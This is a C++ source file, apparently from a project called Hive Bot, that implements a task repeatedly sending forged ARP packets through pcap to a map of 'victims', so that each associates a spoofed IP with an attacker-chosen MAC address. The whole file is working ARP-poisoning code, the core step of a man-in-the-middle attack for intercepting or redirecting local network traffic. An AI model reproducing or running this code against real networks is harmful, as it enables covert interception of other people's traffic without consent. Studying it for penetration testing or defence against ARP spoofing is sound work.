/*
 * Copyright (c) 2017 The Hive Bot project authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

/*
 * poison_task.h - Poison task implementation.
 *
 * Regularly ARP poisons a group of victims at a given interval.
 */

#include "poison_task.h"

#include <iostream>
#include <thread>

namespace hive_bot {

PoisonTask::PoisonTask(std::unordered_map<char*, char*> victims, char* spoof_ip,
                       char* spoof_mac, u_long sleep_duration) {
  victims_ = victims;
  spoof_ip_ = spoof_ip;
  spoof_mac_ = spoof_mac;
  sleep_duration_ = sleep_duration;
}

void PoisonTask::Run() {
  std::cout << "Poisoning victims..." << std::endl;
  const u_int packet_size = sizeof(EthernetHeader) + sizeof(ArpHeader);

  while (running) {
    for (auto it : victims_) {
      u_char packet[packet_size] = { 0 };
      char* ip = it.first;
      char* mac = it.second;
      WriteArp(packet, mac, spoof_mac_, spoof_mac_, mac, spoof_ip_, ip);

      if (pcap_sendpacket(pcap, packet, packet_size) != 0) {
        std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
        return;
      }
    }

    std::this_thread::sleep_for(std::chrono::seconds(sleep_duration_));
  }
}

void PoisonTask::Stop() {
  running = false;
}

} // hive_bot
